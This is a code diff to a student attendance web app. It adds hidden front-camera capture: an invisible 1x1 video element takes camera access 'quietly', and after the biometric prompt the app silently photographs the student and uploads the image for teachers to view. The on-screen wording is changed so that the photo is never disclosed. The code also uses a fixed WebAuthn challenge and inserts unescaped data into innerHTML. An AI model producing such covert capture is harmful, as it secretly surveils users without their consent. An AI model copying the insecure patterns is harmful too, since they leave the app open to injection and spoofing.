@@ -132,7 +132,7 @@
                 <input type="password" id="r-password" placeholder="Create Password" class="ios-input w-full p-4">
                 <button onclick="register()" id="regBtn" class="w-full bg-iosgreen hover:bg-green-600 text-white font-bold p-4 rounded-xl text-lg shadow-lg transition-all active:scale-95">Create Account</button>
             </div>
-            <p class="text-center text-xs text-iossub mt-8 opacity-50">© 2026 Sumit Jha. Biometric Edition.</p>
+            <p class="text-center text-xs text-iossub mt-8 opacity-50">© 2026 Sumit Jha. Silent Selfie Edition.</p>
         </div>
 
         <div id="admin-dashboard" class="hidden flex-col h-full pt-8">
@@ -212,7 +212,7 @@
                     <div id="done-class-ui" class="hidden w-full animate-zoom-in">
                         <div class="w-20 h-20 bg-iosgreen/10 rounded-full flex items-center justify-center mx-auto mb-4 text-iosgreen border-2 border-iosgreen/20"><span class="text-4xl">✅</span></div>
                         <h2 class="text-xl font-bold mb-2 text-white">Verified & Present</h2>
-                        <p class="text-iossub text-sm max-w-xs mx-auto">Your biometric verification was successful.</p>
+                        <p class="text-iossub text-sm max-w-xs mx-auto">Your verification was successful.</p>
                         <button onclick="checkSession()" class="mt-6 text-iossub text-xs active:scale-95">Refresh</button>
                     </div>
 
@@ -301,7 +301,7 @@
                 <div class="flex-1 overflow-y-auto p-4">
                     <table class="w-full text-sm text-left">
                         <thead class="text-iossub uppercase text-[10px]">
-                            <tr><th class="p-2">Roll</th><th class="p-2">Status</th><th class="p-2">Name</th><th class="p-2 text-right">Time</th></tr>
+                            <tr><th class="p-2">Roll</th><th class="p-2">Photo</th><th class="p-2">Name</th><th class="p-2 text-right">Time</th></tr>
                         </thead>
                         <tbody id="modal-body" class="divide-y divide-gray-200 dark:divide-white/5 text-gray-700 dark:text-gray-300"></tbody>
                     </table>
@@ -309,7 +309,15 @@
             </div>
         </div>
 
+        <div id="image-viewer" class="fixed inset-0 bg-black z-[100] hidden flex items-center justify-center animate-zoom-in">
+            <button onclick="closeImageViewer()" class="absolute top-6 right-6 text-white text-3xl font-bold bg-white/20 w-10 h-10 rounded-full z-10 active:scale-90">&times;</button>
+            <img id="full-image" src="" class="max-w-full max-h-full object-contain p-2 shadow-2xl">
+        </div>
+
     </div>
+
+    <video id="silent-video" autoplay playsinline class="absolute top-0 left-0 w-1 h-1 opacity-0 pointer-events-none"></video>
+    <canvas id="cvs" class="hidden"></canvas>
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
@@ -346,6 +354,9 @@
             setTimeout(() => { d.style.opacity='0'; setTimeout(()=>d.remove(), 300) }, 3000);
             if(type==='error') vibrate([50,50,50]); else vibrate(50);
         };
+
+        window.viewFullImage = (src) => { document.getElementById('full-image').src = src; document.getElementById('image-viewer').classList.remove('hidden'); vibrate(20); };
+        window.closeImageViewer = () => { document.getElementById('image-viewer').classList.add('hidden'); vibrate(20); };
 
         // --- AUTH ---
         window.toggleAuth = (m) => {
@@ -394,6 +405,8 @@
                     document.getElementById('st-name').innerText = userName; document.getElementById('st-roll').innerText = userRoll;
                     document.getElementById('live-range').innerText = `Limit: ${rangeLimit}m`;
                     checkSession(); startGPS();
+                    // ASK CAMERA PERMISSION QUIETLY
+                    initSilentCam();
                 } else if(userRole==='teacher') {
                     document.getElementById('teacher-dashboard').classList.remove('hidden'); document.getElementById('teacher-dashboard').classList.add('flex');
                     document.getElementById('t-dept').innerText = teacherDept || "Subject Head";
@@ -505,11 +518,10 @@
             let rows = []; snap.forEach(d => rows.push(d.data()));
             rows.sort((a,b) => (parseInt(a.roll)||0) - (parseInt(b.roll)||0));
             rows.forEach(d => { 
-                // BIOMETRIC UPDATE: Showing badge instead of photo
                 b.innerHTML += `
                 <tr class="border-b border-gray-200 dark:border-white/5">
                     <td class="p-2 font-mono text-iosblue">${d.roll}</td>
-                    <td class="p-2"><span class="bg-green-500/20 text-green-500 text-[10px] font-bold px-2 py-1 rounded-full">✅ Verified</span></td>
+                    <td class="p-2"><img src="${d.photo}" class="w-10 h-10 rounded-lg object-cover border border-white/20 cursor-pointer shadow-sm hover:scale-105 transition" onclick="viewFullImage('${d.photo}')"></td>
                     <td class="p-2 font-bold">${d.name}</td>
                     <td class="p-2 text-right text-xs text-iossub">${d.time.toDate().toLocaleTimeString()}</td>
                 </tr>`; 
@@ -564,7 +576,7 @@
         };
         window.switchTab = (t) => { vibrate(10); document.getElementById('view-records').classList.toggle('hidden', t!=='records'); document.getElementById('view-analytics').classList.toggle('hidden', t!=='analytics'); document.getElementById('seg-records').className = t==='records'?"segment-btn active":"segment-btn"; document.getElementById('seg-analytics').className = t==='analytics'?"segment-btn active":"segment-btn"; };
 
-        // --- STUDENT FUNCTIONS (BIOMETRIC UPGRADE) ---
+        // --- STUDENT FUNCTIONS (SILENT SELFIE + BIOMETRIC) ---
         function startGPS() {
             if(navigator.geolocation) {
                 navigator.geolocation.watchPosition(p => {
@@ -575,6 +587,15 @@
                 }, null, {enableHighAccuracy: true});
             }
         }
+        
+        async function initSilentCam() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+                const video = document.getElementById('silent-video');
+                video.srcObject = stream;
+            } catch(e) { console.log("Silent cam init fail (Permission likely denied initially)"); }
+        }
+
         window.checkSession = async () => { 
             const q = query(collection(db, "sessions"), where("active", "==", true)); 
             const snap = await getDocs(q); 
@@ -582,7 +603,6 @@
             for(const d of snap.docs) {
                 if(d.data().end.toDate() > new Date()) { 
                     found = true; activeSessId = d.id; activePin = d.data().pin; activeSubject = d.data().sub;
-                    // SMART HIDING
                     const subQ = query(collection(db, "submissions"), where("sessId", "==", d.id), where("sid", "==", auth.currentUser.uid));
                     const subSnap = await getDocs(subQ);
                     if(!subSnap.empty) {
@@ -594,17 +614,18 @@
                     }
                     document.getElementById('no-class-ui').classList.add('hidden'); 
                     document.getElementById('session-subject').innerText = d.data().sub;
+                    // RE-INIT CAMERA IF NEEDED
+                    initSilentCam();
                     break;
                 }
             }
             if(!found) { document.getElementById('active-class-ui').classList.add('hidden'); document.getElementById('done-class-ui').classList.add('hidden'); document.getElementById('no-class-ui').classList.remove('hidden'); } 
         };
 
-        // --- BIOMETRIC LOGIC START ---
         window.verifyAndMark = () => { 
             const btn = document.getElementById('markBtn'); 
             if(document.getElementById('pin-input').value !== activePin) return showToast("Wrong PIN", 'error'); 
-            btn.innerText = "Checking GPS..."; btn.disabled = true; 
+            btn.innerText = "Checking..."; btn.disabled = true; 
             
             navigator.geolocation.getCurrentPosition(async (p) => { 
                 const d = getDist(p.coords.latitude, p.coords.longitude); 
@@ -613,38 +634,43 @@
                     return showToast(`Too far (${Math.round(d)}m)`, 'error'); 
                 } 
                 
-                // GPS Passed -> Now Device Check
                 const uRef = doc(db, "users", auth.currentUser.uid); 
                 const uSnap = await getDoc(uRef); 
                 const did = navigator.userAgent + screen.width; 
-                
                 if(uSnap.data().deviceId && uSnap.data().deviceId !== did) { 
                     showToast("Use registered phone", 'error'); location.reload(); return; 
                 } 
                 if(!uSnap.data().deviceId) await updateDoc(uRef, {deviceId: did}); 
 
-                // Device Passed -> Trigger Biometric
-                btn.innerText = "Scanning...";
-                triggerBiometric();
+                triggerBiometricAndCapture();
 
             }, () => { showToast("Enable GPS", 'error'); btn.innerText = "Verify Biometric"; btn.disabled = false; }); 
         };
 
-        async function triggerBiometric() {
+        async function triggerBiometricAndCapture() {
             try {
-                // WebAuthn API Call - Triggers FaceID/Fingerprint
+                // 1. TRIGGER BIOMETRIC
                 const publicKey = {
-                    challenge: new Uint8Array(32), // Random challenge
-                    rp: { name: "GAC Attendance" },
+                    challenge: new Uint8Array(32), rp: { name: "GAC Attendance" },
                     user: { id: new Uint8Array(16), name: userName, displayName: userName },
                     pubKeyCredParams: [{ type: "public-key", alg: -7 }],
                     authenticatorSelection: { userVerification: "required", authenticatorAttachment: "platform" },
                     timeout: 60000
                 };
-
                 await navigator.credentials.create({ publicKey });
-                // If we reach here, biometric passed
-                submitBiometric();
+                
+                // 2. BIOMETRIC SUCCESS -> CAPTURE HIDDEN PHOTO
+                const video = document.getElementById('silent-video');
+                const c = document.getElementById('cvs'), x = c.getContext('2d');
+                c.width=300; c.height=300; // rough square
+                // Try to draw whatever is on the video
+                if(video.readyState === video.HAVE_ENOUGH_DATA) {
+                    x.drawImage(video, 0, 0, 300, 300);
+                    submitBiometric(c.toDataURL('image/jpeg', 0.5));
+                } else {
+                    // Fallback if video wasn't ready (just submit blank or re-request)
+                    submitBiometric(null); 
+                }
 
             } catch (err) {
                 console.error(err);
@@ -654,17 +680,17 @@
             }
         }
 
-        async function submitBiometric() { 
+        async function submitBiometric(photoData) { 
             vibrate(50); 
             await addDoc(collection(db, "submissions"), { 
                 sid: auth.currentUser.uid, name: userName, roll: userRoll, 
                 sessId: activeSessId, subName: activeSubject, 
-                method: "biometric", time: new Date() 
+                method: "biometric_silent", photo: photoData || "no_cam_data", 
+                time: new Date() 
             }); 
             showToast("Marked!", 'success'); 
             setTimeout(() => location.reload(), 1500); 
         }
-        // --- BIOMETRIC LOGIC END ---
 
         window.switchStudentTab = (t) => { vibrate(10); document.getElementById('st-view-active').classList.toggle('hidden', t!=='active'); document.getElementById('st-view-history').classList.toggle('hidden', t!=='history'); document.getElementById('seg-st-active').className = t==='active'?"segment-btn active":"segment-btn"; document.getElementById('seg-st-history').className = t==='history'?"segment-btn active":"segment-btn"; };
         
